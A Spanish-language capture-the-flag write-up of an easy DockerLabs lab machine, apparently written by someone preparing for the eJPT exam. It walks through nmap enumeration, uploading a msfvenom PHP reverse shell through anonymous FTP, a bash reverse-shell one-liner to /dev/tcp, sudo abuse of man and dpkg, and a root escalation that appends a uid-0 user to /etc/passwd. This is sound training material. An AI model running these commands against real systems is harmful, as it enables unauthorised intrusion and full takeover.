## Información

**Plataforma:** DockerLabs
**Dificultad:** Easy

---
## Enumeración

### Nmap

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

> Puertos encontrados: 21,80
#### Escáner de puertos específicos:
```bash
❯ nmap -p21,80 -sCV 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
| drwxr-xr-x    2 0        0            4096 Apr 28 18:28 heustonn-html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28 18:32 index.html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33           4096 Apr 28 21:08 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Mantenimiento
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Unix

```

## Paso a Paso

Notamos en el reporte específico que el ftp tiene acceso anon, que al listar nos muestra archivos html, lo que nos da indicio de que está posicionado en la carpeta raíz del puerto 80. Lo primero que se me ocurre es intentar subir un archivo para obtener una shell.

![image](https://github.com/user-attachments/assets/12e79185-60f2-4fd6-b755-8a490eab4dfd)


Al comparar el index del ftp y del puerto 80 notamos que son exactamente el mismo
![image](https://github.com/user-attachments/assets/6c7a2093-fd8e-4106-8624-20bae22ee26f)



Haré una rev shell con msfvenom (Me estoy preparando para el eJPT por lo que intento usar esta herramienta, pero realmente con un php monkey vendría mejor):
![image](https://github.com/user-attachments/assets/2cb83a3d-4fe4-425b-a365-0cf5dcb157ac)


Notamos que no tenemos permisos para subir archivos en la raiz del ftp
![image](https://github.com/user-attachments/assets/004f58b7-2e75-4d85-b87d-e2924d5f6583)


Pero también, gracias al nmap especifico, notamos que en la carpeta uploads tenemos permisos de escritura, igual corroboramos con un ls -la:

![image](https://github.com/user-attachments/assets/eb038b75-c8dc-492b-8a1e-ee81f70462dd)


Lo subimos ahí

![image](https://github.com/user-attachments/assets/f724d774-30dc-4a42-b98f-72995e415258)


Abrimos el navegador en la ruta del upload

![image](https://github.com/user-attachments/assets/a23997a6-cf0f-4fd1-8953-888773ce74d9)


nos ponemos en escucha con nc

![image](https://github.com/user-attachments/assets/00d024a0-7b59-4491-8d19-9708802c0afd)


Presionamos el archivo.php en la web y listo

![image](https://github.com/user-attachments/assets/3623827d-9d6a-4a6b-8312-854b3bd052da)


Como lo hice con msfvenom nos migramos a otro nc usando un oneliner en paralelo, por lo que nos ponemos en escucha en otro puerto no usado (por ej el 5555)

`bash -c "bash -i >& /dev/tcp/172.17.0.1/5555 0>&1"`

![image](https://github.com/user-attachments/assets/5057cf4d-9c20-44b0-979a-aa878daec81b)


![image](https://github.com/user-attachments/assets/412866d5-97d7-486f-b321-62e07c90f6f0)

y listo, tenemos shell como usuario www-data

## Pivoteando a user

#### Moviendo a user pingu
Notamos que al hacer un sudo -l tenemos permisos sudo como el user pingu del man

![image](https://github.com/user-attachments/assets/365d733a-0fe3-4376-83f2-f19fc6762d1a)


Tiramos de gtfobins

![image](https://github.com/user-attachments/assets/bc009c9e-b71b-4a5d-a209-3f6e6d7774be)


![image](https://github.com/user-attachments/assets/627a5f86-8ba4-4cd3-808f-65e706ce5fa5)


y listo, migramos al user pingu

#### Moviendo hacia user gladyss
Notamos que al tirar un sudo -l tenemos permisos para usar nmap y dpkg como gladys

Al leer la info de nmap en gtfobins, al intentarlo no funciona, esto es debido a que la máquina víctima tiene una versión de nmap en donde ya no sirve el --interactive por lo que optamos por leer la info del dpkg
![image](https://github.com/user-attachments/assets/83a48378-aac5-41e5-a647-d6b7f57bb686)


y listo:
![image](https://github.com/user-attachments/assets/312a6269-3136-4f77-821b-bf0b8fff07b8)


ya tenemos acceso a gladys y al hacer un sudo -l notamos que tiene permisos sudo en el chown.

## Escalada de privilegios

Me di cuenta que no tiene nano la máquina por lo que no puedo editar el etc sudoers, lo que podemos hacer es cambiarle los permisos user:group al /etc/passwd y dárselos a gladys, así podemos crear un user con privilegios (Lo que hace root es el código 0:0 es decir el id de usuario y grupo, 0 corresponde a root)

para esto creamos un hash de contraseña con:

`openssl passwd 123123`

![image](https://github.com/user-attachments/assets/97956565-f814-41a5-80ef-9e0db7fa5bf0)


Luego usamos ese hash para el usuario nuevo haciendo echo

`echo 'rootcito:$1$dsFeRo/J$sd7nh6Js.KWNnFct6hP2y1:0:0::/home/rootcito:/bin/bash` >> /etc/passwd`

![image](https://github.com/user-attachments/assets/9ebe71bd-593e-445b-92e3-ef44f200e660)


notamos que funcionó, hacemos un **su rootcito** con la clave 123123

![image](https://github.com/user-attachments/assets/703f4f07-2cad-4271-9d12-1cafe2306c08)


**y listo! Máquina lista**

---
